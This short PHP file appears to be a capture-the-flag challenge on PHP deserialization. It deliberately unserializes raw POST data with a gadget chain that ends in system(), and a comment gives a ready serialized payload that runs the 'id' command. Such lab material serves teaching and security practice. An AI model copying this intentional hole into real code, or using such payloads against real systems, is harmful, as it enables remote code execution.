<?php
// POP 链构造
class Gadget {
    public $cmd;

    public function __destruct() {
        system($this->cmd);  // 【漏洞】RCE
    }
}

class Trigger {
    public $gadget;

    public function __toString() {
        return is_object($this->gadget) ? serialize($this->gadget) : '';
    }
}

class Chain {
    public $next;

    public function __wakeup() {
        // 触发链式调用
        echo $this->next;  // 触发 __toString
    }
}

$data = $_POST['data'] ?? '';
unserialize($data);
// 攻击者构造: O:5:"Chain":1:{s:4:"next";O:7:"Trigger":1:{s:6:"gadget";O:6:"Gadget":1:{s:3:"cmd";s:2:"id";}}}
require_once __DIR__ . '/../../../../app/bootstrap_challenge.php';
xxr_flag_reveal('deser');
